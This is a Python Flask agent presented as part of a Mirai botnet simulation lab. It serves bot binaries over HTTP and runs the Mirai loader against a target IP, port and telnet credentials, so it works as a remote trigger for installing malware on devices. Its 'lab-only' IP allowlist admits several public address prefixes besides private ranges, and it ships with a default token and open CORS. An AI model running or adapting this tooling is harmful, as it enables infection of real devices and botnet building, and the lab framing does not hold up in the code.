#!/usr/bin/env python3
"""
Lab Loader Agent — isolated Mirai simulation only.
Runs on Loader host (185.10.20.200): start HTTP bins server, run loader.dbg.

  export LAB_TOKEN=lab-only
  export HTTP_ROOT=/opt/http-server
  export LOADER_BIN=/root/Mirai-Botnet-Simulation-Lab/loader/loader.dbg
  python3 agent.py   # :9090
"""

from __future__ import annotations

import ipaddress
import os
import re
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

LAB_TOKEN = os.environ.get("LAB_TOKEN", "lab-only")
AGENT_HOST = os.environ.get("AGENT_HOST", "0.0.0.0")
AGENT_PORT = int(os.environ.get("AGENT_PORT", "9090"))
HTTP_ROOT = Path(os.environ.get("HTTP_ROOT", "/opt/http-server"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "80"))
LOADER_DIR = Path(
    os.environ.get(
        "LOADER_DIR",
        str(Path(__file__).resolve().parents[1]),
    )
)
LOADER_BIN = Path(os.environ.get("LOADER_BIN", str(LOADER_DIR / "loader.dbg")))

_lock = threading.Lock()
_http_proc: subprocess.Popen | None = None
_last_loader: dict = {
    "running": False,
    "started_at": None,
    "finished_at": None,
    "exit_code": None,
    "target": None,
    "log_tail": "",
    "ok_line": None,
    "error": None,
}
_loader_thread: threading.Thread | None = None

USER_RE = re.compile(r"^[A-Za-z0-9._@+-]{1,32}$")
PASS_RE = re.compile(r"^[A-Za-z0-9._@+!#$%*=-]{0,64}$")


def _auth_ok() -> bool:
    token = request.headers.get("X-Lab-Token") or request.args.get("token") or ""
    if request.is_json:
        body = request.get_json(silent=True) or {}
        token = token or str(body.get("token") or "")
    return token == LAB_TOKEN


def _require_auth():
    if not _auth_ok():
        return jsonify({"ok": False, "error": "unauthorized"}), 401
    return None


def _port_open(port: int) -> bool:
    try:
        out = subprocess.check_output(
            ["ss", "-lntp"],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=3,
        )
    except (subprocess.SubprocessError, FileNotFoundError, OSError):
        return False
    return f":{port} " in out or f":{port}\n" in out


def _validate_target(ip: str, port: int, user: str, password: str) -> str | None:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return "invalid ip"
    # Lab-only: private / documentation ranges commonly used in this project
    if not (
        addr.is_private
        or addr.is_loopback
        or str(addr).startswith("185.10.20.")
        or str(addr).startswith("110.164.")
        or str(addr).startswith("125.20.")
        or str(addr).startswith("66.249.")
        or str(addr).startswith("203.0.113.")
        or str(addr).startswith("210.89.")
    ):
        return "ip not in lab allowlist"
    if not (1 <= port <= 65535):
        return "invalid port"
    if not USER_RE.match(user):
        return "invalid username"
    if not PASS_RE.match(password):
        return "invalid password (use simple lab credentials)"
    return None


def _http_status() -> dict:
    running = _http_proc is not None and _http_proc.poll() is None
    return {
        "running": running or _port_open(HTTP_PORT),
        "pid": _http_proc.pid if running else None,
        "port": HTTP_PORT,
        "root": str(HTTP_ROOT),
        "port_listen": _port_open(HTTP_PORT),
    }


@app.get("/health")
def health():
    return jsonify(
        {
            "ok": True,
            "service": "mirai-lab-loader-agent",
            "host_role": "loader",
            "lab_ip": "185.10.20.200",
        }
    )


@app.get("/status")
def status():
    denied = _require_auth()
    if denied:
        return denied
    with _lock:
        loader = dict(_last_loader)
    return jsonify(
        {
            "ok": True,
            "http": _http_status(),
            "loader": loader,
            "paths": {
                "http_root": str(HTTP_ROOT),
                "loader_bin": str(LOADER_BIN),
                "loader_dir": str(LOADER_DIR),
                "loader_bin_exists": LOADER_BIN.is_file(),
                "bins_dlr": (LOADER_DIR / "bins").is_dir(),
            },
        }
    )


@app.post("/http/start")
def http_start():
    denied = _require_auth()
    if denied:
        return denied

    global _http_proc
    with _lock:
        if _http_proc is not None and _http_proc.poll() is None:
            return jsonify({"ok": True, "message": "http already running", "http": _http_status()})
        if _port_open(HTTP_PORT):
            return jsonify(
                {
                    "ok": True,
                    "message": f"port {HTTP_PORT} already listening (external server)",
                    "http": _http_status(),
                }
            )
        if not HTTP_ROOT.is_dir():
            return jsonify({"ok": False, "error": f"HTTP_ROOT missing: {HTTP_ROOT}"}), 400

        log_path = Path("/tmp/lab-http-server.log")
        try:
            logf = open(log_path, "ab", buffering=0)
            _http_proc = subprocess.Popen(
                [sys.executable, "-m", "http.server", str(HTTP_PORT), "--bind", "0.0.0.0"],
                cwd=str(HTTP_ROOT),
                stdout=logf,
                stderr=subprocess.STDOUT,
                start_new_session=True,
            )
        except OSError as exc:
            return jsonify({"ok": False, "error": str(exc)}), 500

    time.sleep(0.4)
    return jsonify({"ok": True, "message": "http server started", "http": _http_status()})


@app.post("/http/stop")
def http_stop():
    denied = _require_auth()
    if denied:
        return denied

    global _http_proc
    with _lock:
        if _http_proc is None or _http_proc.poll() is not None:
            _http_proc = None
            return jsonify({"ok": True, "message": "http not managed / already stopped", "http": _http_status()})
        try:
            os.killpg(os.getpgid(_http_proc.pid), signal.SIGTERM)
        except (ProcessLookupError, PermissionError, OSError):
            try:
                _http_proc.terminate()
            except OSError:
                pass
        try:
            _http_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(_http_proc.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError, OSError):
                _http_proc.kill()
        _http_proc = None
    return jsonify({"ok": True, "message": "http stopped", "http": _http_status()})


def _run_loader_job(line: str, target: str) -> None:
    global _last_loader
    log_chunks: list[str] = []
    ok_line = None
    exit_code = -1
    err = None
    try:
        proc = subprocess.Popen(
            [str(LOADER_BIN)],
            cwd=str(LOADER_DIR),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        assert proc.stdin is not None and proc.stdout is not None
        proc.stdin.write(line + "\n")
        proc.stdin.close()

        for raw in proc.stdout:
            # Drop huge binary dumps from arch detect for UI tail
            if len(raw) > 400 and not raw.lstrip().startswith("["):
                continue
            if any(k in raw for k in ("TELIN:", "TELOUT:", "ELF")) and "[" not in raw[:8]:
                continue
            log_chunks.append(raw.rstrip("\n"))
            if raw.startswith("OK|") or "|OK|" in raw or raw.strip().startswith("OK|"):
                ok_line = raw.strip()
            if "OK|" in raw:
                ok_line = raw.strip()
            if len(log_chunks) > 200:
                log_chunks = log_chunks[-200:]
            with _lock:
                _last_loader["log_tail"] = "\n".join(log_chunks[-80:])
                if ok_line:
                    _last_loader["ok_line"] = ok_line

        exit_code = proc.wait(timeout=300)
    except Exception as exc:  # noqa: BLE001 — surface to UI
        err = str(exc)
        exit_code = -1
    finally:
        with _lock:
            _last_loader.update(
                {
                    "running": False,
                    "finished_at": time.time(),
                    "exit_code": exit_code,
                    "target": target,
                    "log_tail": "\n".join(log_chunks[-80:]),
                    "ok_line": ok_line,
                    "error": err,
                }
            )


@app.post("/loader/run")
def loader_run():
    denied = _require_auth()
    if denied:
        return denied

    global _loader_thread, _last_loader
    data = request.get_json(silent=True) or {}
    ip = str(data.get("ip") or "").strip()
    port = int(data.get("port") or 23)
    user = str(data.get("user") or data.get("username") or "").strip()
    password = str(data.get("pass") or data.get("password") or "").strip()

    bad = _validate_target(ip, port, user, password)
    if bad:
        return jsonify({"ok": False, "error": bad}), 400
    if not LOADER_BIN.is_file():
        return jsonify({"ok": False, "error": f"loader binary missing: {LOADER_BIN}"}), 400
    if not (LOADER_DIR / "bins").exists():
        return jsonify({"ok": False, "error": f"missing {LOADER_DIR}/bins (need dlr.*)"}), 400

    with _lock:
        if _last_loader.get("running"):
            return jsonify({"ok": False, "error": "loader already running"}), 409
        line = f"{ip}:{port} {user}:{password}"
        target = f"{ip}:{port}"
        _last_loader = {
            "running": True,
            "started_at": time.time(),
            "finished_at": None,
            "exit_code": None,
            "target": target,
            "log_tail": f"[agent] starting: {line}\n",
            "ok_line": None,
            "error": None,
        }
        _loader_thread = threading.Thread(
            target=_run_loader_job,
            args=(line, target),
            daemon=True,
        )
        _loader_thread.start()

    return jsonify(
        {
            "ok": True,
            "message": "loader started",
            "target": f"{ip}:{port}",
            "command_shape": f'echo "{ip}:{port} {user}:***" | loader.dbg',
        }
    )


@app.get("/loader/log")
def loader_log():
    denied = _require_auth()
    if denied:
        return denied
    with _lock:
        return jsonify({"ok": True, "loader": dict(_last_loader)})


def main() -> None:
    print(f"[lab-agent] loader host API :{AGENT_PORT}", file=sys.stderr)
    print(f"[lab-agent] HTTP_ROOT={HTTP_ROOT}", file=sys.stderr)
    print(f"[lab-agent] LOADER_BIN={LOADER_BIN}", file=sys.stderr)
    print(f"[lab-agent] token required via X-Lab-Token", file=sys.stderr)
    app.run(host=AGENT_HOST, port=AGENT_PORT, debug=False, threaded=True)


if __name__ == "__main__":
    main()
